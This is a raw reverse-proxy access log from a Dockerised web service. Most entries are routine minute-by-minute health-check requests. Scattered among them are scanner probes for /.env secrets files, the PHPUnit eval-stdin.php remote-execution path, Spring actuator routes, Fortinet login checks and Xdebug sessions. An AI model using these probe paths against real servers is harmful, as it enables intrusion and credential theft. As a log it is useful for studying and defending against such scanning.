64.62.197.163 - - [16/Dec/2023:07:36:14 +0000] "GET /remote/logincheck HTTP/1.1" 404 19 "-" "-" 1516 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:07:36:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1517 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:07:36:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1518 "www@docker" "http://172.29.0.8:80" 1ms
64.62.197.164 - - [16/Dec/2023:07:37:11 +0000] "GET /geoserver/web/ HTTP/1.1" 404 19 "-" "-" 1519 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:07:37:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1520 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:07:37:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1521 "www@docker" "http://172.29.0.8:80" 0ms
83.97.73.87 - - [16/Dec/2023:07:38:00 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 17 "-" "-" 1522 "web-to-websecure@internal" "-" 0ms
83.97.73.87 - - [16/Dec/2023:07:38:00 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 404 19 "-" "-" 1523 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:07:38:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1524 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:07:38:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1525 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:07:39:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1526 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:07:39:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1527 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:07:40:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1528 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:07:40:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1529 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:07:41:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1530 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:07:41:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1531 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:07:42:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1532 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:07:42:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1533 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:07:43:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1534 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:07:43:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1535 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:07:44:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1536 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:07:44:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1537 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:07:45:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1538 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:07:45:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1539 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:07:46:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1540 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:07:46:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1541 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:07:47:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1542 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:07:47:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1543 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:07:48:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1544 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:07:48:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1545 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:07:49:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1546 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:07:49:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1547 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:07:50:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1548 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:07:50:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1549 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:07:51:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1550 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:07:51:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1551 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:07:52:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1552 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:07:52:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1553 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:07:53:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1554 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:07:53:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1555 "www@docker" "http://172.29.0.8:80" 1ms
54.36.115.221 - - [16/Dec/2023:07:53:48 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1556 "web-to-websecure@internal" "-" 0ms
54.36.115.221 - - [16/Dec/2023:07:53:48 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1557 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [16/Dec/2023:07:53:56 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1558 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [16/Dec/2023:07:53:56 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1559 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:07:54:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1560 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:07:54:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1561 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:07:55:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1562 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:07:55:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1563 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:07:56:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1564 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:07:56:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1565 "www@docker" "http://172.29.0.8:80" 0ms
167.94.146.55 - - [16/Dec/2023:07:56:42 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1566 "-" "-" 0ms
167.94.146.55 - - [16/Dec/2023:07:56:45 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1567 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:07:57:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1568 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:07:57:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1569 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:07:58:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1570 "www@docker" "http://172.29.0.8:80" 0ms
83.97.73.87 - - [16/Dec/2023:07:58:30 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 17 "-" "-" 1571 "web-to-websecure@internal" "-" 0ms
83.97.73.87 - - [16/Dec/2023:07:58:32 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 404 19 "-" "-" 1572 "-" "-" 0ms
167.71.120.76 - - [16/Dec/2023:07:58:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1573 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:07:59:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1574 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:07:59:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1575 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:00:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1576 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:08:00:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1577 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:08:01:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1578 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:08:01:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1579 "www@docker" "http://172.29.0.8:80" 1ms
143.110.222.166 - - [16/Dec/2023:08:01:38 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1580 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:08:02:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1581 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:08:02:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1582 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:03:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1583 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:08:03:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1584 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:08:04:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1585 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:08:04:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1586 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:05:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1587 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:08:05:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1588 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:06:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1589 "www@docker" "http://172.29.0.8:80" 0ms
162.142.125.14 - - [16/Dec/2023:08:06:22 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1590 "-" "-" 0ms
162.142.125.14 - - [16/Dec/2023:08:06:27 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1591 "-" "-" 0ms
167.71.120.76 - - [16/Dec/2023:08:06:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1592 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:07:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1593 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:08:07:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1594 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:08:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1595 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:08:08:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1596 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:09:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1597 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:08:09:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1598 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:10:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1599 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:08:10:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1600 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:11:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1601 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:08:11:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1602 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:08:12:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1603 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:08:12:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1604 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:13:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1605 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:08:13:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1606 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:08:14:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1607 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:08:14:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1608 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:15:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1609 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:08:15:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1610 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:16:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1611 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:08:16:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1612 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:17:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1613 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:08:17:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1614 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:18:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1615 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:08:18:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1616 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:19:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1617 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:08:19:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1618 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:20:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1619 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:08:20:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1620 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:21:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1621 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:08:21:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1622 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:22:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1623 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:08:22:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1624 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:23:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1625 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:08:23:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1626 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:24:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1627 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:08:24:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1628 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:25:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1629 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:08:25:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1630 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:26:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1631 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:08:26:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1632 "www@docker" "http://172.29.0.8:80" 0ms
143.110.222.166 - - [16/Dec/2023:08:26:45 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1633 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:08:27:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1634 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:08:27:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1635 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:28:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1636 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:08:28:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1637 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:29:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1638 "www@docker" "http://172.29.0.8:80" 0ms
162.243.151.41 - - [16/Dec/2023:08:29:34 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1639 "-" "-" 0ms
91.92.243.232 - - [16/Dec/2023:08:29:35 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1640 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [16/Dec/2023:08:29:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1641 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:30:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1642 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:08:30:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1643 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:08:31:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1644 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:08:31:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1645 "www@docker" "http://172.29.0.8:80" 0ms
80.79.117.42 - - [16/Dec/2023:08:31:54 +0000] "GET / HTTP/1.0" 404 19 "-" "-" 1646 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:08:32:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1647 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:08:32:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1648 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:33:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1649 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:08:33:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1650 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:34:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1651 "www@docker" "http://172.29.0.8:80" 0ms
172.233.57.47 - - [16/Dec/2023:08:34:24 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1652 "-" "-" 0ms
172.233.57.47 - - [16/Dec/2023:08:34:25 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1653 "-" "-" 0ms
167.71.120.76 - - [16/Dec/2023:08:34:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1654 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:35:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1655 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:08:35:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1656 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:36:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1657 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:08:36:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1658 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:37:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1659 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:08:37:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1660 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:38:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1661 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:08:38:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1662 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:08:39:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1663 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:08:39:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1664 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:40:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1665 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:08:40:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1666 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:41:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1667 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:08:41:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1668 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:42:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1669 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:08:42:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1670 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:43:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1671 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:08:43:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1672 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:44:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1673 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:08:44:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1674 "www@docker" "http://172.29.0.8:80" 0ms
78.153.140.221 - - [16/Dec/2023:08:45:16 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1675 "web-to-websecure@internal" "-" 0ms
78.153.140.221 - - [16/Dec/2023:08:45:17 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 1676 "-" "-" 0ms
78.153.140.221 - - [16/Dec/2023:08:45:17 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 1677 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:08:45:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1678 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:08:45:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1679 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:46:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1680 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:08:46:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1681 "www@docker" "http://172.29.0.8:80" 0ms
83.97.73.87 - - [16/Dec/2023:08:47:09 +0000] "GET /actuator/gateway/routes HTTP/1.1" 301 17 "-" "-" 1682 "web-to-websecure@internal" "-" 0ms
83.97.73.87 - - [16/Dec/2023:08:47:10 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 19 "-" "-" 1683 "-" "-" 0ms
20.254.167.83 - - [16/Dec/2023:08:47:10 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1684 "web-to-websecure@internal" "-" 0ms
20.254.167.83 - - [16/Dec/2023:08:47:10 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1685 "web-to-websecure@internal" "-" 0ms
20.254.167.83 - - [16/Dec/2023:08:47:11 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 1686 "-" "-" 0ms
20.254.167.83 - - [16/Dec/2023:08:47:11 +0000] "POST / HTTP/1.1" 404 19 "-" "-" 1687 "-" "-" 0ms
20.254.167.83 - - [16/Dec/2023:08:47:16 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 17 "-" "-" 1688 "web-to-websecure@internal" "-" 0ms
20.254.167.83 - - [16/Dec/2023:08:47:16 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 19 "-" "-" 1689 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:08:47:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1690 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:08:47:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1691 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:48:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1692 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:08:48:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1693 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:49:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1694 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:08:49:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1695 "www@docker" "http://172.29.0.8:80" 1ms
57.129.23.166 - - [16/Dec/2023:08:50:14 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1696 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [16/Dec/2023:08:50:14 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1697 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:08:50:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1698 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:08:50:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1699 "www@docker" "http://172.29.0.8:80" 0ms
